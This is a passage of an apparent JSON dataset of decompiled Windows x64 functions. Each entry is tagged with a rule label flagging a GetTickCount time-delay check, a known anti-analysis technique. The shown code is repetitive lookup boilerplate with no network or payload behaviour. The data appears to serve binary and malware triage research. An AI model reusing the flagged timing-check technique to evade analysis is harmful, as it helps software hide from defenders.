fcn.14002c080(*0x1401100e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113320, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113340, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113360, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113380, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113400, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113450, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113490, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401135b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113640, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113660, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113680, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 4300
    },
    "1400b967": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9670(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108450);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112770, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108460);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401127b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108470);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401127f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108480);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140112810, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113240, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113280, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113320, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113340, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113360, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113380, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113400, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113450, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113490, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 4149
    },
    "1400b96d": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b96d0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(0x140108460);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401127b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108470);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401127f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108480);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140112810, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113240, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113280, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113320, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113340, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113360, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113380, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113400, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113450, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113490, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        